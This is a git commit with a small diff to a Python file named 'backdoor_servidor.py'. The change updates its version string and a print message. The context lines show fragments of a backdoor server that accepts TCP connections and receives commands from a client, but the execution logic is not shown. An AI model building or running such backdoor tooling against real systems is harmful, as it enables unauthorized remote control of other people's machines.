16ad03714dbd3f830740e09c50f95ef37c7cb2d8
Andrés Hernández Mata <andreshernandezmta@gmail.com>
2021-04-14 06:11:48 -0500

    Actualizar mensaje de salida
    Version 2.0.1

--- src/backdoor_servidor.py
+++ src/backdoor_servidor.py
@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creado: Andrés Hernández Mata
-Version: 2.0.0
+Version: 2.0.1
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -23,7 +23,7 @@ print("[+] Iniciado Servidor...")
 
 while True:    
     cliente, direccion = TCPServerSocket.accept()
-    print("[-] Direccion ", direccion)          
+    print("[+] Direccion ", direccion)          
     while True:        
         comando = cliente.recv(bufferSize)
         if comando == b"":
